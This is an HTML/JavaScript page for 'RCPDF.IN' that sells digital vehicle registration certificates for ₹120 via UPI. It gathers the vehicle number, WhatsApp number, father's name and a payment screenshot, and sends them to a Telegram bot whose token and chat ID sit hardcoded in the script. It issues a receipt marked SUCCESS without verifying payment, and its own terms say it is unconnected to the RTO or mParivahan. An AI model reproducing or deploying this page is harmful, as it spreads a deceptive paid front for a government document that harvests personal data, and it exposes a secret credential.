<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RCPDF.IN - Digital RC</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --primary: #ff0066; --ind-blue: #003399; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
        
        /* Tiranga Background with Bright Saffron */
        body { 
            background: linear-gradient(180deg, #FF9933 0%, #ffffff 45%, #ffffff 55%, #138808 100%);
            background-attachment: fixed;
            color: #000; overflow-x: hidden; min-height: 100vh;
        }

        .header { position: fixed; top: 0; width: 100%; background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; height: 60px; border-bottom: 3px solid var(--ind-blue); }
        .logo { color: var(--ind-blue); font-weight: 900; font-size: 22px; text-decoration: none; }

        .card { margin: 100px auto 20px; width: 92%; max-width: 420px; background: rgba(255, 255, 255, 0.98); padding: 30px 20px; border-radius: 25px; text-align: center; border: 2px solid var(--ind-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.2); }

        .hsrp-plate { background: #fff; width: 100%; height: 80px; border: 2px solid #000; border-radius: 12px; display: flex; align-items: center; overflow: hidden; margin-bottom: 15px; position: relative; }
        .ind-strip { background: var(--ind-blue); width: 65px; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; z-index: 2; position: absolute; left: 0; }
        .ind-strip img { width: 30px; margin-bottom: 4px; }
        .ind-strip span { font-size: 16px; font-weight: 900; }
        
        #vehInput { flex: 1; border: none; height: 100%; font-size: 26px; font-weight: 900; text-align: center; outline: none; text-transform: uppercase; width: 100%; padding-left: 70px; }

        #mob, #fatherName { width: 100%; padding: 18px; border-radius: 12px; border: 2px solid #ddd; margin-bottom: 15px; font-size: 20px; text-align: center; font-weight: bold; }

        /* Neon RGB Border for Screenshot Box */
        .neon-box {
            position: relative; padding: 4px; border-radius: 15px; background: #000; overflow: hidden; margin-bottom: 20px;
        }
        .neon-box::before {
            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: conic-gradient(#ff0000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000);
            animation: rotateRGB 3s linear infinite;
        }
        .inner-box { position: relative; background: #fff; border-radius: 11px; padding: 15px; z-index: 1; }

        .neon-btn {
            position: relative; background: #000; color: #fff; font-size: 20px; font-weight: 900;
            padding: 18px; width: 100%; border-radius: 15px; border: none; cursor: pointer;
            text-transform: uppercase; margin-bottom: 25px; overflow: hidden; display: flex; align-items: center; justify-content: center;
        }
        .neon-btn::before {
            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: conic-gradient(#ff0000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000);
            animation: rotateRGB 2s linear infinite;
        }
        .neon-btn::after { content: 'PAYMENT WITH UPI ❤️'; position: absolute; inset: 4px; background: #000; border-radius: 12px; display: flex; align-items: center; justify-content: center; z-index: 1; }
        
        @keyframes rotateRGB { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        .btn { width: 100%; padding: 18px; border-radius: 12px; border: none; background: var(--ind-blue); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; }
        .loader-wrap { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; color: #fff; }
        .pct { font-size: 45px; font-weight: 900; color: #ff0066; margin-top: 20px; }
        .overlay { position: fixed; inset: 0; z-index: 9999; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; color: #fff; padding: 20px; background: rgba(0, 128, 0, 0.98); }
    </style>
</head>
<body>

    <div class="header">
        <b class="logo">RCPDF.IN</b>
        <button style="background:none; border:none; font-size:24px;" onclick="location.reload()">🏠</button>
    </div>

    <div id="successOverlay" class="overlay">
        <h1 style="font-size: 40px;">😊</h1>
        <h1 style="font-size: 30px;">Congratulations!</h1>
        <p style="font-size: 18px; margin-top: 10px;">Aapka REQUEST bhej diya gaya hai.</p>
    </div>

    <div class="card">
        <div id="p1">
            <h2 style="margin-bottom:15px; color: var(--ind-blue);">Download Digital RC</h2>
            <div class="hsrp-plate">
                <div class="ind-strip"><img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg"><span>IND</span></div>
                <input type="text" id="vehInput" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatV(this)">
            </div>
            <button class="btn" onclick="go2()">CONTINUE</button>
        </div>

        <div id="p2" style="display:none;">
            <button class="neon-btn" onclick="pay()"></button>
            <div style="background:#fff; padding:10px; border-radius:15px; display:inline-block; margin-bottom:15px; border:1px solid #ddd;">
                <img id="qr" src="" width="160">
                <p style="font-size:10px; font-weight:bold; margin-top:5px;">SCAN QR TO PAY ₹120</p>
            </div>
            <input type="tel" id="mob" placeholder="WhatsApp Number" maxlength="10">
            <input type="text" id="fatherName" placeholder="Father's Name (Optional)">
            
            <div class="neon-box">
                <div class="inner-box">
                    <input type="file" id="ss" accept="image/*" style="width:100%;">
                    <p style="font-size:11px; margin-top:5px; color:#555; font-weight:bold;">Upload Payment Screenshot</p>
                </div>
            </div>

            <button class="btn" onclick="submit()">Verify & Download PDF</button>
        </div>
    </div>

    <div class="loader-wrap" id="load">
        <div class="pct" id="pText">0%</div>
        <p>🔄 Processing Order (Don't Refresh)...</p>
    </div>

    <script>
        const T_TOKEN = "8138238341:AAGi4LxV7247hUvs_HoGLSKRhkcEapMCSuA";
        const T_CHAT_ID = "5600045707";

        function formatV(i) {
            let v = i.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            let out = "";
            if (v.length > 0) out += v.substring(0, 2);
            if (v.length > 2) out += "-" + v.substring(2, 4);
            if (v.length > 4) out += "-" + v.substring(4, 6);
            if (v.length > 6) out += "-" + v.substring(6, 10);
            i.value = out;
        }

        function go2() {
            if(document.getElementById('vehInput').value.length < 9) { alert("Please Enter Valid Vehicle Number!"); return; }
            const upi = "upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC%20DOWNLOAD";
            document.getElementById('qr').src = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + encodeURIComponent(upi);
            document.getElementById('p1').style.display='none'; document.getElementById('p2').style.display='block';
        }

        function pay() { window.location.href="upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC%20DOWNLOAD"; }

        async function sendT(f, d, t, tx) {
            let fd = new FormData();
            let fn = document.getElementById('fatherName').value || "Not Provided";
            fd.append("chat_id", T_CHAT_ID); fd.append("photo", f);
            fd.append("caption", `🚀 *NEW RC ORDER*\n\n🆔 *TxId:* \`${tx}\`\n📅 *Date:* ${d}\n⏰ *Time:* ${t}\n🚗 *Veh:* ${document.getElementById('vehInput').value}\n📱 *Mob:* ${document.getElementById('mob').value}\n👤 *Father:* ${fn}\n💰 *Amt:* ₹120`);
            fd.append("parse_mode", "Markdown");
            try { await fetch(`https://api.telegram.org/bot${T_TOKEN}/sendPhoto`, { method: "POST", body: fd }); return true; } catch (e) { return false; }
        }

        function submit() {
            const m = document.getElementById('mob').value;
            const s = document.getElementById('ss').files[0];
            if(m.length < 10) { alert("Please enter 10 digit WhatsApp number!"); return; }
            if(!s) { alert("Please upload payment screenshot!"); return; }

            document.getElementById('load').style.display='flex';
            let p = 0;
            let iv = setInterval(async () => {
                p += 5; document.getElementById('pText').innerText = p + "%";
                if (p === 60) {
                    const now = new Date();
                    const dStr = now.toLocaleDateString('en-IN');
                    const tStr = now.toLocaleTimeString('en-IN');
                    const txId = "RC" + Math.floor(Math.random() * 9000000000);
                    await sendT(s, dStr, tStr, txId);
                    makePDF(dStr, tStr, txId); // Professional PDF Call
                }
                if (p >= 100) {
                    clearInterval(iv);
                    document.getElementById('load').style.display='none';
                    document.getElementById('successOverlay').style.display='flex';
                    setTimeout(() => location.reload(), 4000);
                }
            }, 100);
        }

        function makePDF(d, t, tx) {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            
            // PURANA PROFESSIONAL FORMAT
            doc.setFillColor(0, 51, 153); doc.rect(5, 5, 200, 30, 'F');
            doc.setTextColor(255); doc.setFont("helvetica", "bold"); doc.setFontSize(22);
            doc.text("RCPDF.IN - PAYMENT RECEIPT", 105, 25, null, null, "center");
            
            doc.setTextColor(0); doc.setFontSize(12); doc.setDrawColor(200);
            let y = 50;
            const data = [
                ["TRANSACTION ID:", tx], 
                ["DATE & TIME:", `${d} | ${t}`], 
                ["VEHICLE NO:", document.getElementById('vehInput').value], 
                ["WHATSAPP NO:", document.getElementById('mob').value], 
                ["AMOUNT PAID:", "INR 120.00"], 
                ["STATUS:", "SUCCESS"]
            ];
            
            data.forEach(item => {
                doc.rect(15, y, 180, 10);
                doc.setFont("helvetica", "bold"); doc.text(item[0], 20, y + 7);
                doc.setFont("helvetica", "normal"); doc.text(item[1], 85, y + 7);
                y += 10;
            });

            // QR area
            doc.rect(15, y + 5, 180, 45);
            doc.setFont("helvetica", "bold"); doc.text("SUPPORT QR CODE", 25, y + 15);
            doc.addImage(document.getElementById('qr').src, 'PNG', 150, y + 10, 35, 35);
            
            y += 65;
            doc.setFontSize(14); doc.text("TERMS AND CONDITIONS", 15, y);
            doc.setFontSize(10); doc.setTextColor(80);
            const tnc = [
                "1. Ye website SIRF information use ke liye hai.",
                "2. Galat use ki jimmedari sirf user ki hogi.",
                "3. Payment hone ke baad refund nahi hogi.",
                "4. Ye site RTO ya mParivahan se sambandhit nahi hai.",
                "",
                "* Your original RC PDF will be delivered on WhatsApp (30-60 mins)."
            ];
            doc.text(tnc, 15, y + 8);
            doc.setDrawColor(0); doc.rect(5, 5, 200, 287);
            doc.save(`Receipt_${tx}.pdf`);
        }
    </script>
</body>
</html>
